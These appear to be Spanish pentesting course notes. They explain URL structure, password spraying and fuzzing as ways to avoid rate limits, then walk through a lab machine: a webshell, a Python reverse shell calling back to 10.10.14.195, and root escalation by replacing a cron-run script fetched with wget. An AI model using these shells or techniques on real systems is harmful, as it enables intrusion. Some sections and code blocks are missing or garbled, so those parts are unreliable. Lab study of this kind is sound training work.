## ① Anatomía de una URL €” análisis sintáctico

Carlos repasa la estructura de una URL como si fuera un análisis sintáctico de Lengua:

```
https://www.amazon.es/admin/search.php?id=123&cat=libros
|____| |__________||___________||___________| |_________|
  1          2           3           4             5

1. Protocolo (https) + subprotocolo (TCP/IP)
2. Dominio (amazon.es) + TLD (.es = España, .com = global)
3. Directorio (/admin) €” el "sujeto de la oración"
4. Parámetro (search.php) €” después del interrogante
5. Variables (id=123&cat=libros) €” pares clave=valor separados por &
```

| Componente | Ejemplo | Descripción |
|------------|---------|-------------|
| **Protocolo** | `https://` | TCP/IP seguro. También puede ser FTP, SSH, SMB |
| **Dominio** | `amazon.es` | Procedencia (.es España, .mx México, .com global) |
| **Directorio** | `/admin` | Carpeta en el servidor €” el "sujeto" |
| **Interrogante** | `?` | Separa directorio de parámetros |
| **Parámetro** | `search.php` | Función/endpoints que recibe variables |
| **Variables** | `id=123&cat=libros` | Pares clave=valor, separados por `&` |

> [!important] La regla de los `&`
> Cuando hay múltiples parámetros, se separan con `&` (ampersand). **NO se pone interrogante después del `&`**. Ejemplo: `?param1=valor1&param2=valor2`. El interrogante solo aparece **una vez**, al principio.

> [!important] La analogía de Carlos
> "Cada uno de vosotros es un directorio. Mariana tiene sus cosas, Charchas las suyas. Si yo le pregunto a Mariana y me responde, sé que existe (200). Si le pregunto a Asier y no me responde, no existe (404)."

## ② Fuerza bruta vs. Password spraying vs. Directory listing

### ¿Por qué son cosas distintas?

La distinción no es académica €” tiene consecuencias directas sobre si el sistema levanta alertas o bloquea la IP.

### Rate limit €” el concepto clave

```
Rate limit = N intentos / unidad de tiempo

Ejemplo típico: 3 intentos cada 5 minutos por usuario
 = 1 intento cada 100 segundos (1,5 minutos)
```

> [!important] ¿Qué activa el rate limit?
> El bloqueo se activa por **intentos repetidos sobre el mismo endpoint**, no por volumen total de peticiones. Cambiar de endpoint entre cada intento es lo que hace que ciertas técnicas no levanten alarmas.

### Comparativa de las tres técnicas

| Técnica | Qué hace | ¿Activa rate limit? | ¿Por qué? |
|---------|----------|---------------------|-----------|
| **Fuerza bruta** | Múltiples valores contra el **mismo endpoint** | **SÍ** | Golpea el mismo punto una y otra vez |
| **Password spraying** | **Una misma contraseña** contra **todos los usuarios** | **NO** | Cada usuario es un endpoint diferente |
| **Directory listing** | Prueba **diferentes directorios** | **NO** | Cada directorio es un endpoint diferente |

### Fuerza bruta €” el problema

```
Fuerza bruta en /wp-login.php para usuario "admin":

admin:123 → 500
admin:456 → 500
admin:789 → 500
... (repitiendo contra el mismo punto)
→ RATE LIMIT → BLOQUEO
```

Además, el espacio de búsqueda es **exponencial**:

| Longitud | Caracteres | Combinaciones | Tiempo estimado |
|----------|------------|---------------|-----------------|
| 4 | Solo números | 10.000 | Segundos |
| 6 | Alfanuméricos | ~568 millones | Minutos |
| 8 | Alfanuméricos | ~218 billones | Días |
| 10 | Alfanuméricos | ~839 cuatrillones | Años |
| 14 | Alfanuméricos + especiales | ~63 quintillones | **200+ millones de años** |

> [!warning] La trampa de la exponencialidad
> "Antes de llegar a 14 caracteres, tenés que probar TODAS las combinaciones de 1, 2, 3... 13 caracteres. Todo es sumatorio."

### Password spraying €” la alternativa inteligente

```
Contraseña "empresa2026" contra TODOS los usuarios:

María → 200 │œ“
Charchas → 404
Oscar → 200 │œ“
John → 404
...

Siguiente tanda: "empresa2026!"
... (y así sucesivamente)
```

> [!important] Ejemplo real de Carlos
> "Llego a una empresa de 700 abogados. Pruebo `abogadosplus2026` contra todos. Si al menos 100 usuarios me dan positivo, está normal. Luego pruebo `abogadosplus2026!`, `abogadosplus2025`, `abogadosplus2025!`. Con esas cuatro combinaciones, el 25% me ha dado resultado positivo."

**¿Por qué funciona?** Porque "la gente es imbécil y la contraseña más utilizada en tu puesto de trabajo es el nombre de la empresa con el número."

### Directory listing €” ¿por qué no es fuerza bruta?

```
Directorios probados:
/admin → 200 │œ“
/uploads → 200 │œ“
/config → 404
/dev → 200 │œ“
/images → 200 │œ“
```

Cada directorio es un **endpoint diferente**. El comportamiento normal de un navegador ya genera decenas de peticiones a rutas diferentes al cargar cualquier página. Por eso el sistema no lo detecta como ataque.

### La analogía del SIEM

> "Si yo soy muy pesado y pregunto '¿me dejás un euro?' una y otra vez al mismo, a la décima me detecta el SIEM. Pero si le pregunto uno a Asier, otro a Chema, otro a Oscar... cuando vuelvo a Asier, ya ha pasado tiempo y no me reconoce."

## ③ Fuzzing €” la técnica más versátil

### ¿Qué es fuzzing?

Fuzzing = **generalización del directory listing**. Permite colocar el payload en **cualquier posición** de la URL.

### Las 4 posiciones del fuzzing

```
1. Subdominios:
 [FUZZ].amazon.es → admin.amazon.es, dev.amazon.es, api.amazon.es

2. Directorios:
 amazon.es/[FUZZ] → /admin, /uploads, /config

3. Parámetros:
 amazon.es/api?[FUZZ]=valor → ?id=valor, ?page=valor, ?search=valor

4. Variables:
 amazon.es/search?q=[FUZZ] → ?q=test, ?q=1, ?q=admin
```

> [!important] La ventaja del fuzzing
> "El fuzzing recorre las dos mejores cosas de la fuerza bruta y del directory listing:å®ƒå®ƒ combina la iteración sistemática con la capacidad de descubrir estructuras ocultas."

### Herramientas de fuzzing

| Herramienta | Uso principal | Nota |
|-------------|---------------|------|
| **ffuf** | Fuzzing general (directorios, parámetros) | La de referencia |
| **x8** | Enumeración de parámetros ocultos | Específico para parámetros |
| **dirsearch** | Directorios (tiene medium-low propio) | Complementario a gobuster |
| **gobuster** | Directorios | Rápido, popular |
| **feroxbuster** | Directorios + ficheros con extensiones (`-x`) | El más versátil |

> [!warning] Docker falla
> "Docker es una auténtica mierda. Veis por qué os digo que no utilicéis Docker? Porque no funciona para nada." La alternativa es compilar con **Cargo** (Rust) o crear el fuzzer en Python.

### Diccionarios importantes

| Diccionario | Uso | Ruta |
|-------------|-----|------|
| `common.txt` | Directorios web | `/usr/share/wordlists/dirb/common.txt` |
| `big.txt` | Directorios ampliado | `/usr/share/wordlists/dirb/big.txt` |
| `rockyou.txt` | **Contraseñas** (NO para directorios) | `/usr/share/wordlists/rockyou.txt` |
| `directory-list-2.3-medium.txt` | Directorios (SecLists) | `/usr/share/wordlists/dirb/` |

> [!important] Regla OSCP
> RockYou es de contraseñas, **NO sirve para directorios**. Los wordlists de directorios son para fuzzing web, no para brute force SSH.

Al acceder a `/dev/bash.php`, se muestra una shell web:

```

$ ls

```

> [!important] Shell real, no de MrRobot
> "El código vulnerable de la herramienta en sí está conectado directamente con el servidor. Los comandos que estamos inyectando aquí son contra el servidor, es una shell real."

### Paso 2: Verificar herramientas disponibles

```bash
# ¿Tiene Netcat?
$ ls /bin | grep nc
nc

# ¿Tiene Python?
```

### Paso 3: Generar reverse shell con Python

```python
# Reverse shell en Python 2 (de revshells.com)
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.195", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

### Paso 4: Escuchar con Netcat

```bash
# En la máquina atacante

```

## ⑦ Escalada de privilegios €” Script Hijacking por Cronjob

### Paso 1: Los 5 comandos iniciales

```bash
whoami # www-data
pwd # /var/www/html
uname -a # Versión del kernel
sudo -l # Permisos de sudo
find / -perm -4000 -type f 2>/dev/null # Buscar SUIDs
```

### Paso 2: sudo -l €” el hallazgo

```bash
$ sudo -l
User www-data may run the following commands:
 (scriptmanager) NOPASSWD: /bin/bash
```

> [!important] Movimiento lateral
> `www-data` puede ejecutar comandos como `scriptmanager` **sin contraseña**.

### Paso 3: Cambiar a scriptmanager

```bash
sudo -u scriptmanager -i
# -i = interactive (conseguir una bash)
```

> [!important] La regla de Carlos
> "Si listamos todos los comandos que podemos utilizar con sudo, y nos dicen que podemos cambiarnos a scriptmanager, tendremos que hacerlo utilizando sudo."

### Paso 4: Explorar /home/scriptmanager

```bash
$ pwd
/home/scriptmanager

$ ls -la
# No hay nada relevante
```

### Paso 5: Buscar el directorio /scripts

```bash
$ cd /scripts
$ ls
test.py test.txt

$ ls -la
-rw-r--r-- 1 root root 12 Mar 2 10:30 test.txt
-rw-r--r-- 1 scriptmanager scriptmanager 85 Mar 2 10:30 test.py
```

| Fichero | Propietario | Permisos | Contenido |
|---------|-------------|----------|-----------|
| `test.txt` | **root** | Lectura para todos | "testing 123" |
| `test.py` | **scriptmanager** | Lectura/Escritura | Abre test.txt y escribe "testing 123" |

### Paso 6: Entender la cadena de ejecución

```
test.py (scriptmanager) → escribe en → test.txt (root)
 → →
 Nosotros podemos Root ejecuta esto
 modificar este periódicamente (cron)
```

> [!important] La clave de la escalada
> `test.txt` es propiedad de root, pero `test.py` lo puede modificar porque **quien ejecuta `test.py` es root** a través de un cronjob. Esto se confirma observando que la fecha de modificación de `test.txt` cambia periódicamente aunque nadie lo haya modificado manualmente.

> [!important] La metáfora de Carlos
> "Es como dejar las llaves del coche en el bolsillo del abrigo que cuelga en el recibidor. El coche es de root, pero cualquiera que entre al recibidor puede coger las llaves."

### Paso 7: Verificar el cronjob

```bash
# No podemos ver el crontab de root directamente
$ crontab -l
# (vacío para scriptmanager)

# Pero la evidencia está en test.txt:
# Si su fecha de modificación cambia sin que nosotros lo hagamos,
# es que hay un cron que ejecuta test.py como root
```

> [!important] Cómo detectar un cron sin verlo
> "La forma de ver si hay un cron es fijarnos en la fecha de modificación del fichero. Si cuando vamos actualizando y listando en algún momento se modifica, es que hay algo que lo ha modificado."

### Paso 8: Modificar test.py con reverse shell

```bash
# En la máquina atacante, crear test.py con reverse shell:
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.195", 4440))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

```bash
# Montar servidor HTTP para transferir el fichero
python3 -m http.server 8000
```

### Paso 9: Descargar y ejecutar

```bash
# En la máquina víctima (como scriptmanager):
$ rm test.py
$ wget http://10.10.14.195:8000/test.py
$ cat test.py # Verificar contenido
$ chmod +x test.py
```

### Paso 10: Escuchar y esperar

```bash
# En la máquina atacante:
nc -lvnp 4440

# Esperar a que el cronjob ejecute test.py como root...
# (puede tardar unos minutos)
```

```
Connection from 10.0.2.x
$ whoami
root
$ cat /root/root.txt
FLAG{...}
```

> [!important] Resultado
> Shell de **root** obtenida. La vulnerabilidad no está en el sistema operativo sino en la **configuración**: un fichero que root ejecuta pero que otros usuarios pueden escribir.

## ⑨ Conceptos clave para recordar

| Concepto | Definición |
|----------|------------|
| **Rate limit** | N intentos / unidad de tiempo. Se activa por intentos repetidos sobre el **mismo endpoint** |
| **Fuerza bruta** | Múltiples valores contra el **mismo endpoint** → activa rate limit |
| **Password spraying** | Una contraseña contra **todos los usuarios** → NO activa rate limit |
| **Directory listing** | Prueba **diferentes directorios** → cada uno es endpoint diferente → NO activa rate limit |
| **Fuzzing** | Generalización del directory listing. Payload en cualquier posición de la URL |
| **Script hijacking** | Modificar un fichero que otro usuario (con más privilegios) ejecuta periódicamente |
| **Cronjob** | Tarea programada que ejecuta un fichero periódicamente, normalmente como root |
| **Webshell** | Shell web que permite ejecutar comandos en el servidor desde el navegador |
